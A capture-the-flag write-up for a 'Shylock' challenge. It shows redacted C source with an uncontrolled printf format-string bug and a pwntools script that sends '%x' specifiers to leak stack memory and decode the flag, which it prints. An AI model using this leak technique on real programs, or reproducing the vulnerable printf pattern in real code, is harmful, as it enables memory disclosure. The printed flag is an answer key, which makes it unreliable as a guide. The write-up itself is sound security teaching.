**Flag:**
```
JUCTF{h4th_n0t_a_j3w_3y3s}
```

We are given an executable binary file *'5hy10ck.exe'* (Windows) and *'5hy10ck.out'* (Linux) along with a PDF *'5hy10ck_src.pdf'* containing redacted source code.

```C++

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char thyname[128];

char bassanio[64] = █████████████████████████████████;
char antonio[64] = █████████████████████████████████;

char* need_ducats(const char* who, const char* for_whom)
{
    int i;
    char* forfeit = (char *) malloc(64 * sizeof(char));
    
    for(i = 0; i < 64; i++)
    {
        forfeit[i] = █████████████████████████████████;
    }
    
    return forfeit;
}

int main()
{
    char pound_of_flesh[64];
    strcpy(pound_of_flesh, need_ducats(antonio, bassanio));
    
    printf("SHYLOCK GPT\n");
    printf("-----------\n\n");
    
    printf("Who art thou? \n");
    printf(">> ");
    scanf("%s", thyname);
    
    printf("\nBegone! Let no man disturb me whilst I sup, unless Antonio cometh with his pound of flesh!\n");
    printf("Thou hath no business with me, ");
    printf(thyname);
    printf("\n");
    
    return 0;
}

```

From the code, it is quite apparent that the intended solution was a classic [**Format String Exploit**](https://owasp.org/www-community/attacks/Format_string_attack). Below is the code for the same that uses [**pwn**](https://github.com/Gallopsled/pwntools#readme) to interact with the binary:

```python

from pwn import *

io = process('./5hy10ck.out')
context.log_level = 'DEBUG'

io.recvuntil(b'thou?')

io.sendline('%x' + '-%x' * 32)

io.recvuntil(b'me, ')
data = io.recvuntil(b'\n')[:-1]

data = data.decode()

S = ''
for byte in data.split('-'):
    byte = byte.rjust(8, '0')
    
    A = bytearray.fromhex(byte)
    
    for C in reversed(A):
        if(C >= 32 and C < 128):
            S += chr(C)            

print('\n\n', S)

```

![img](https://user-images.githubusercontent.com/96875426/227787951-02050457-951a-4ff3-b545-48fdabff4943.png)
